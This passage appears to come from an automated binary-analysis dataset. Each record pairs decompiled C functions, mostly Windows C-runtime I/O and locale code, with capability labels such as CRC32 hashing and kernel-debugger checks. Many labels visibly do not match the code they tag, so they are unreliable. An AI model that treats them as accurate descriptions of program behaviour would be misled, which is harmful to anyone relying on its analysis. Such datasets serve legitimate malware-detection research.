        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00460a84(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    pcVar1 = fcn.00460090(9, \"GetProcessWindowStation\", 0x47f39c, \"GetProcessWindowStation\");\n    if ((pcVar1 != NULL) &&\n       (pcVar2 = fcn.00460090(0xd, \"GetUserObjectInformationW\", 0x47f41c, \"GetUserObjectInformationW\"),  pcVar2 != NULL)\n       ) {\n        (**0x47b3f8)();\n        iVar3 = (*pcVar1)();\n        if (iVar3 != 0) {\n            var_10h = 0;\n            uStack16 = 0;\n            var_8h = 0;\n            (**0x47b3f8)(iVar3, 1, &var_10h, 0xc, 0);\n            (*pcVar2)();\n        }\n    }\n    fcn.004303e9(var_10h);\n    return;\n}\n",
        "token_count": 301
    },
    "00460c11": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.00460c11(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0x68) >> 8 & 0xffffff01;\n}\n",
        "token_count": 58
    },
    "004625be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_720h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004625be(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t var_720h;\n    uint var_71ch;\n    uint lpCPInfo;\n    uint var_712h;\n    uint var_704h;\n    uint var_304h;\n    uint var_204h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if ((*(arg_8h + 4) == 0xfde9) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*(arg_8h + 4), &lpCPInfo),  iVar4 == 0)\n       ) {\n        puVar6 = arg_8h + 0x19;\n        var_720h = -0x5a - arg_8h;\n        do {\n            if (puVar6 + var_720h < 0x1a) {\n                *puVar6 = *puVar6 | 0x10;\n                cVar2 = puVar6 + ' ';\ncode_r0x0046273a:\n                uVar3 = cVar2 + (-0x19 - arg_8h);\n            }\n            else {\n                if (puVar6 + (-0x7a - arg_8h) < 0x1a) {\n                    *puVar6 = *puVar6 | 0x20;\n                    cVar2 = puVar6 + -0x20;\n                    goto code_r0x0046273a;\n                }\n                uVar3 = 0;\n            }\n            puVar6[0x100] = uVar3;\n            puVar6 = puVar6 + 1;\n        } while (puVar6 + (-0x19 - arg_8h) < 0x100);\n    }\n    else {\n        iVar4 = 0x100;\n        uVar5 = 0;\n        do {\n            *(&var_104h + uVar5) = uVar5;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 0x100);\n        puVar7 = &var_712h;\n        var_104h._0_1_ = 0x20;\n        while (var_712h != 0) {\n            uVar3 = *(puVar7 + 1);\n            for (uVar5 = var_712h; (uVar5 <= uVar3 && (uVar5 < 0x100)); uVar5 = uVar5 + 1) {\n                *(&var_104h + uVar5) = 0x20;\n            }\n            puVar7 = puVar7 + 2;\n            var_712h._0_1_ = *puVar7;\n        }\n        fcn.00466783(0, 1, &var_104h, 0x100, &var_704h, *(arg_8h + 4), 0);\n        fcn.0046e3ea(0, *(arg_8h + 0x21c), 0x100, &var_104h, 0x100, &var_204h, 0x100, *(arg_8h + 4), 0);\n        fcn.0046e3ea(0, *(arg_8h + 0x21c), 0x200, &var_104h, 0x100, &var_304h, 0x100, *(arg_8h + 4), 0);\n        puVar6 = arg_8h + 0x19;\n        iVar8 = 0;\n        do {\n            uVar1 = *(&var_704h + iVar8 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    *puVar6 = *puVar6 | 0x20;\n                    uVar3 = *(&var_304h + iVar8);\n                }\n            }\n            else {\n                *puVar6 = *puVar6 | 0x10;\n                uVar3 = *(&var_204h + iVar8);\n            }\n            iVar8 = iVar8 + 1;\n            puVar6[0x100] = uVar3;\n            puVar6 = puVar6 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.004303e9(var_720h);\n    return;\n}\n",
        "token_count": 1142
    },
    "004647d7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004647d7(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.00464825(0);\n    }\n    else {\n        iVar1 = fcn.00464908(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            if ((*(arg_8h + 0xc) >> 0xb & 1) == 0) {\n                iVar1 = 0;\n            }\n            else {\n                arg_8h_00 = fcn.0045efb0(arg_8h);\n                iVar1 = fcn.0046e858(arg_8h_00);\n                iVar1 = -(iVar1 != 0);\n            }\n        }\n        else {\n            iVar1 = -1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 213
    },
    "00464872": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464872(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    \n    if (arg_8h != 0) {\n        if ((*(arg_8h + 0xc) >> 0xd & 1) != 0) {\n            cVar1 = fcn.004648e5(*(arg_8h + 0xc));\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n            *arg_ch = *arg_ch + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 133
    },
    "00464908": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464908(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t arg_10h;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 & 3) == 2) && ((*puVar1 & 0xc0) != 0)) {\n        iVar2 = arg_8h[1];\n        arg_10h = *arg_8h - iVar2;\n        *arg_8h = iVar2;\n        arg_8h[2] = 0;\n        if (0 < arg_10h) {\n            arg_8h_00 = fcn.0045efb0(arg_8h);\n            iVar2 = fcn.0046f10e(arg_8h_00, iVar2, arg_10h, arg_ch);\n            if (arg_10h != iVar2) {\n                LOCK();\n                *puVar1 = *puVar1 | 0x10;\n                return 0xffffffff;\n            }\n            if ((*puVar1 >> 2 & 1) != 0) {\n                LOCK();\n                *puVar1 = *puVar1 & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "00464971": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464971(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint uVar2;\n    uint var_28h;\n    \n    uVar2 = 0;\n    fcn.0043b732(0);\n    if (arg_8h == 0) {\n        uVar2 = fcn.00464825(0);\n        goto code_r0x004649c8;\n    }\n    iVar1 = fcn.00464908(arg_8h, &var_28h);\n    if (iVar1 == 0) {\n        if ((*(arg_8h + 0xc) >> 0xb & 1) == 0) goto code_r0x004649c8;\n        arg_8h_00 = fcn.0045efb0(arg_8h);\n        iVar1 = fcn.0046e858(arg_8h_00);\n        if (iVar1 == 0) goto code_r0x004649c8;\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004649c8:\n    fcn.0043b78b();\n    return uVar2;\n}\n",
        "token_count": 268
    },
    "004650a2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004650a2(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x6cd830)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        iVar1 = *((arg_8h >> 6) * 4 + 0x6cd630);\n        if (((*(iVar3 + 0x28 + iVar1) & 1) != 0) && (*(iVar3 + 0x18 + iVar1) != -1)) {\n            iVar1 = fcn.00458730();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x00465108;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, 0);\n            }\ncode_r0x00465108:\n            *(*((arg_8h >> 6) * 4 + 0x6cd630) + 0x18 + iVar3) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar2 = fcn.0043bcb5();\n    *puVar2 = 9;\n    puVar2 = fcn.0043bca2();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 397
    },
    "00466deb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466deb(int16_t *arg_8h)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    uint *in_stack_ffffff54;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar5 = fcn.0045ce63();\n    iVar6 = fcn.0046054c(arg_8h, (-(*(iVar5 + 100) != 0) & 0xfffff005) + 0x1002, &var_84h, 0x40);\n    if (iVar6 == 0) {\n        *(iVar5 + 0x58) = 0;\n        goto code_r0x00467083;\n    }\n    in_stack_ffffff54 = &var_84h;\n    iVar6 = fcn.0047007e(*(iVar5 + 0x54), in_stack_ffffff54);\n    if (iVar6 != 0) goto code_r0x00466f3e;\n    in_stack_ffffff54 = 0x40;\n    iVar6 = fcn.0046054c(arg_8h, (-(*(iVar5 + 0x60) != 0) & 0xfffff002) + 0x1001, &var_84h, 0x40);\n    if (iVar6 == 0) {\n        *(iVar5 + 0x58) = 0;\n        goto code_r0x00467083;\n    }\n    iVar6 = fcn.0047007e(*(iVar5 + 0x50), &var_84h);\n    piVar7 = arg_8h;\n    if (iVar6 == 0) {\n        *(iVar5 + 0x58) = *(iVar5 + 0x58) | 0x304;\n        do {\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\ncode_r0x00466f1c:\n        iVar6 = fcn.0043bf88(iVar5 + 0x2a0, 0x55, arg_8h, (piVar7 - (arg_8h + 1) >> 1) + 1);\n        if (iVar6 != 0) goto code_r0x004670c1;\n    }\n    else if ((*(iVar5 + 0x58) & 2) == 0) {\n        if ((*(iVar5 + 0x5c) == 0) || (iVar6 = fcn.004701ce(*(iVar5 + 0x50), &var_84h, *(iVar5 + 0x5c)),  iVar6 != 0)) {\n            if (((*(iVar5 + 0x58) & 1) != 0) || (iVar6 = fcn.0046727b(arg_8h),  iVar6 == 0)) goto code_r0x00466f3e;\n            *(iVar5 + 0x58) = *(iVar5 + 0x58) | 1;\n            do {\n                iVar2 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n        }\n        else {\n            *(iVar5 + 0x58) = *(iVar5 + 0x58) | 2;\n            do {\n                iVar2 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n        }\n        goto code_r0x00466f1c;\n    }\ncode_r0x00466f3e:\n    if ((*(iVar5 + 0x58) & 0x300) == 0x300) goto code_r0x00467083;\n    iVar6 = fcn.0046054c(arg_8h, (-(*(iVar5 + 0x60) != 0) & 0xfffff002) + 0x1001, &var_84h, 0x40);\n    if (iVar6 == 0) {\n        *(iVar5 + 0x58) = 0;\n        goto code_r0x00467083;\n    }\n    iVar6 = fcn.0047007e(*(iVar5 + 0x50), &var_84h);\n    if (iVar6 != 0) goto code_r0x00467083;\n    uVar3 = *(iVar5 + 0x58);\n    *(iVar5 + 0x58) = uVar3 | 0x200;\n    piVar7 = arg_8h;\n    if (*(iVar5 + 0x60) == 0) {\n        if (*(iVar5 + 0x5c) != 0) {\n            piVar8 = *(iVar5 + 0x50);\n            piVar1 = piVar8 + 1;\n            do {\n                iVar2 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n            if (piVar8 - piVar1 >> 1 == *(iVar5 + 0x5c)) {\n                iVar6 = fcn.0046727b(arg_8h);\n                if (iVar6 == 0) {\n                    piVar8 = *(iVar5 + 0x50);\n                    piVar1 = piVar8 + 1;\n                    do {\n                        iVar2 = *piVar8;\n                        piVar8 = piVar8 + 1;\n                    } while (iVar2 != 0);\n                    iVar6 = fcn.00466db7(*(iVar5 + 0x50));\n                    if (iVar6 == piVar8 - piVar1 >> 1) goto code_r0x00467083;\n                }\n                *(iVar5 + 0x58) = *(iVar5 + 0x58) | 0x100;\n                if (*(iVar5 + 0x2a0) != 0) goto code_r0x00467083;\n                do {\n                    iVar2 = *piVar7;\n                    piVar7 = piVar7 + 1;\n                } while (iVar2 != 0);\n                goto code_r0x0046705f;\n            }\n        }\n        *(iVar5 + 0x58) = uVar3 | 0x300;\n        if (*(iVar5 + 0x2a0) != 0) goto code_r0x00467083;\n        do {\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n    }\n    else {\n        *(iVar5 + 0x58) = uVar3 | 0x300;\n        if (*(iVar5 + 0x2a0) != 0) goto code_r0x00467083;\n        do {\n            iVar2 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar2 != 0);\n    }\ncode_r0x0046705f:\n    iVar5 = fcn.0043bf88(iVar5 + 0x2a0, 0x55, arg_8h, (piVar7 - (arg_8h + 1) >> 1) + 1);\n    if (iVar5 != 0) {\ncode_r0x004670c1:\n        fcn.0043bb6b(0, 0, 0, 0, 0);\n        pcVar4 = swi(3);\n        (*pcVar4)();\n        return;\n    }\ncode_r0x00467083:\n    fcn.004303e9(in_stack_ffffff54);\n    return;\n}\n",
        "token_count": 1759
    },
    "00468eb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00468eb8(int32_t arg_8h, char *arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    \n    if (arg_18h == 0) {\n        return '4' < *arg_ch;\n    }\n    iVar2 = fcn.0046cc3c();\n    if (iVar2 == 0) {\n        if ('5' < *arg_ch) {\n            return true;\n        }\n        if ('4' < *arg_ch) {\n            uVar3 = fcn.00468e95(arg_ch + 1, arg_14h);\n            iVar2 = uVar3 >> 0x20;\n            if (uVar3 != '\\0') {\n                return true;\n            }\n            if (iVar2 != arg_8h) {\n                return *(iVar2 + -1) & 1;\n            }\n        }\n    }\n    else if (iVar2 == 0x200) {\n        cVar1 = fcn.00468e95(arg_ch, arg_14h);\n        if ((cVar1 != '\\0') && (arg_10h != 0x2d)) {\n            return true;\n        }\n    }\n    else if (((iVar2 == 0x100) && (cVar1 = fcn.00468e95(arg_ch, arg_14h),  cVar1 != '\\0')) && (arg_10h == 0x2d)) {\n        return true;\n    }\n    return false;\n}\n",
        "token_count": 357
    },
    "0046d99d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d99d(uint32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    \n    fcn.0045efb0(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        *(arg_10h + 0x18) = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) == 0) {\ncode_r0x0046d5fb:\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 2;\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffff7;\n                arg_ch[2] = 0;\n                if ((arg_ch[3] & 0x4c0) == 0) {\n                    cVar1 = fcn.0045f718(arg_ch);\n                    if (cVar1 == '\\0') {\n                        fcn.00471f3e(arg_ch);\n                    }\n                }\n                cVar1 = fcn.0046d766(arg_8h, arg_ch, arg_10h);\n                if (cVar1 == '\\0') {\n                    LOCK();\n                    arg_ch[3] = arg_ch[3] | 0x10;\n                    arg_8h = 0xffffffff;\n                }\n                else {\n                    arg_8h = arg_8h & 0xff;\n                }\n                return arg_8h;\n            }\n            cVar1 = fcn.0046d918(arg_ch);\n            arg_ch[2] = 0;\n            if (cVar1 != '\\0') {\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n                goto code_r0x0046d5fb;\n            }\n            goto code_r0x0046d5a0;\n        }\n        *(arg_10h + 0x18) = 0x22;\n    }\n    *(arg_10h + 0x1c) = 1;\ncode_r0x0046d5a0:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 525
    },
    "0046d9a8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d9a8(uint32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    \n    fcn.0045efb0(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        *(arg_10h + 0x18) = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) == 0) {\ncode_r0x0046d6f3:\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 2;\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffff7;\n                arg_ch[2] = 0;\n                if ((arg_ch[3] & 0x4c0) == 0) {\n                    cVar1 = fcn.0045f718(arg_ch);\n                    if (cVar1 == '\\0') {\n                        fcn.00471f3e(arg_ch);\n                    }\n                }\n                cVar1 = fcn.0046d838(arg_8h, arg_ch, arg_10h);\n                if (cVar1 == '\\0') {\n                    LOCK();\n                    arg_ch[3] = arg_ch[3] | 0x10;\n                    arg_8h = 0xffff;\n                }\n                else {\n                    arg_8h = arg_8h & 0xffff;\n                }\n                return arg_8h;\n            }\n            cVar1 = fcn.0046d918(arg_ch);\n            arg_ch[2] = 0;\n            if (cVar1 != '\\0') {\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n                goto code_r0x0046d6f3;\n            }\n            goto code_r0x0046d696;\n        }\n        *(arg_10h + 0x18) = 0x22;\n    }\n    *(arg_10h + 0x1c) = 1;\ncode_r0x0046d696:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffff;\n}\n",
        "token_count": 524
    },
    "0046f10e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.0046f10e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t lpCriticalSection;\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486ee8, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        iVar3 = *(unaff_EBP + 0x14);\n        *(iVar3 + 0x24) = 1;\n        *(iVar3 + 0x20) = 0;\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 9;\n    }\n    else {\n        if ((lpCriticalSection < 0) || (*0x6cd830 <= lpCriticalSection)) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        if (bVar1) {\n            *(unaff_EBP + -0x20) = lpCriticalSection >> 6;\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x24) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x6cd630) + 0x28 + iVar3) & 1) != 0) {\n                fcn.00464eb7(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x24) + 0x28 + *(*(unaff_EBP + -0x20) * 4 + 0x6cd630)) & 1) == 0) {\n                    iVar3 = *(unaff_EBP + 0x14);\n                    *(iVar3 + 0x1c) = 1;\n                    *(iVar3 + 0x18) = 9;\n                    *(iVar3 + 0x24) = 1;\n                    *(iVar3 + 0x20) = 0;\n                }\n                else {\n                    uVar2 = fcn.0046f21f(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14)\n                                        );\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0046f217();\n                goto code_r0x0046f201;\n            }\n        }\n        iVar3 = *(unaff_EBP + 0x14);\n        *(iVar3 + 0x24) = 1;\n        *(iVar3 + 0x20) = 0;\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 9;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar3);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x0046f201:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 861
    },
    "0046f21f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0046f21f(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t var_30h;\n    uint lpNumberOfBytesWritten;\n    uint uStack44;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t nNumberOfBytesToWrite;\n    char *lpBuffer;\n    uint var_1h;\n    \n    var_10h = arg_8h;\n    lpBuffer = arg_ch;\n    nNumberOfBytesToWrite = arg_10h;\n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_ch == NULL) {\ncode_r0x0046f24b:\n        *(arg_14h + 0x24) = 1;\n        *(arg_14h + 0x20) = 0;\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_14h);\n        return -1;\n    }\n    var_14h = arg_8h >> 6;\n    var_18h = (arg_8h & 0x3f) * 0x38;\n    var_1h._0_1_ = *(var_18h + 0x29 + *(var_14h * 4 + 0x6cd630));\n    if (((var_1h == '\\x02') || (var_1h == '\\x01')) && ((~arg_10h & 1) == 0)) goto code_r0x0046f24b;\n    if ((*(var_18h + 0x28 + *(var_14h * 4 + 0x6cd630)) & 0x20) != 0) {\n        fcn.00471f20(arg_8h, 0, 0, 2, arg_14h);\n    }\n    iVar4 = 0;\n    var_24h = 0;\n    cVar2 = fcn.0046ed53(var_10h, arg_14h);\n    if (cVar2 == '\\0') {\n        iVar1 = *(var_14h * 4 + 0x6cd630);\n        if (*(iVar1 + 0x28 + var_18h) < '\\0') {\n            if (var_1h == '\\0') {\n                piVar3 = fcn.0046edd0(&var_30h, var_10h, lpBuffer, nNumberOfBytesToWrite);\n            }\n            else if (var_1h == '\\x01') {\n                piVar3 = fcn.0046ef94(&var_30h, var_10h, lpBuffer, nNumberOfBytesToWrite);\n            }\n            else {\n                if (var_1h != '\\x02') goto code_r0x0046f3d2;\n                piVar3 = fcn.0046eeab(&var_30h, var_10h, lpBuffer, nNumberOfBytesToWrite);\n            }\n        }\n        else {\n            var_30h = 0;\n            lpNumberOfBytesWritten = 0;\n            uStack44 = 0;\n            iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                              (*(iVar1 + 0x18 + var_18h), lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            if (iVar4 == 0) {\n                var_30h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            piVar3 = &var_30h;\n        }\n    }\n    else if (var_1h == '\\0') {\n        piVar3 = fcn.0046e924(&var_30h, var_10h, lpBuffer, nNumberOfBytesToWrite, arg_14h);\n    }\n    else {\n        if ((var_1h != '\\x01') && (var_1h != '\\x02')) goto code_r0x0046f3d2;\n        piVar3 = fcn.0046eceb(&var_30h, lpBuffer, nNumberOfBytesToWrite);\n    }\n    iVar4 = *piVar3;\n    var_24h = iVar4;\n    var_20h = piVar3[1];\n    var_1ch = piVar3[2];\n    if (var_20h != 0) {\n        return var_20h - var_1ch;\n    }\ncode_r0x0046f3d2:\n    if (iVar4 != 0) {\n        if (iVar4 == 5) {\n            *(arg_14h + 0x1c) = 1;\n            *(arg_14h + 0x18) = 9;\n            *(arg_14h + 0x24) = 1;\n            *(arg_14h + 0x20) = 5;\n            return -1;\n        }\n        fcn.0043bc7e(iVar4, arg_14h);\n        return -1;\n    }\n    if (((*(*(var_14h * 4 + 0x6cd630) + 0x28 + var_18h) & 0x40) != 0) && (*lpBuffer == '\\x1a')) {\n        return 0;\n    }\n    *(arg_14h + 0x1c) = 1;\n    *(arg_14h + 0x18) = 0x1c;\n    *(arg_14h + 0x24) = 1;\n    *(arg_14h + 0x20) = 0;\n    return -1;\n}\n",
        "token_count": 1380
    },
    "004708e7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004708e7(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | (arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2) >> 1 | ((arg_8h & 2) << 3 | arg_8h & 4) * 2 |\n           (arg_8h & 1) << 4;\n}\n",
        "token_count": 103
    },
    "0047092b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0047092b(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | (arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2) >> 1 | ((arg_8h & 2) << 3 | arg_8h & 4) * 2 |\n           (arg_8h & 1) << 4;\n}\n",
        "token_count": 103
    },
    "004709b4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004709b4(uint32_t arg_8h)\n\n{\n    return (arg_8h & 8 | (arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2) >> 1 | ((arg_8h & 2) << 3 | arg_8h & 4) * 2 |\n           (arg_8h & 1) << 4;\n}\n",
        "token_count": 103
    },
    "004709f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004709f8(uint32_t arg_8h)\n\n{\n    return (((arg_8h & 4 | ((arg_8h & 1) << 2 | arg_8h & 2) << 2) << 2 | arg_8h & 8) << 3 | arg_8h & 0x30) << 3;\n}\n",
        "token_count": 89
    },
    "00470a32": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00470a32(uint32_t arg_8h)\n\n{\n    return (arg_8h & 4 | ((arg_8h & 1) << 2 | arg_8h & 2) << 2) * 2 | arg_8h >> 4 & 3 | arg_8h >> 1 & 4;\n}\n",
        "token_count": 85
    },
    "00470bce": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
